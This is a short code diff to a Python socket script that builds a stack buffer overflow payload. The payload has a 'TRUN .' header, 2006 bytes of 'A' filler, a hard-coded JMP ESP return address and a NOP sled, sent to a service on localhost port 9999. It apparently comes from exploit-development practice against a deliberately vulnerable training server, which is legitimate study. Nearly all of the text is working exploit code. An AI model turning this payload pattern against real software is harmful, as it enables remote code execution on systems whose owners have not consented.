@@ -9,8 +9,7 @@ def connect_to_server(host='127.0.0.1', port=9999):
         client_socket.connect((host, port))
         print(f"Successfully connected to {host} on port {port}")
 
-        # Example of sending a message (5000 'A's, which is 0x41 in ASCII)
-        header = b"TRUN ."
+        header = b"TRUN ." # Header
         filler_offset = b"A" * 2006 # Offset
         ret_address = b"\xaf\x11\x50\x62" #  JMP ESP address `0x625011af`
         nop_sled = b"\x90" * 10 #NOP opcode is 90
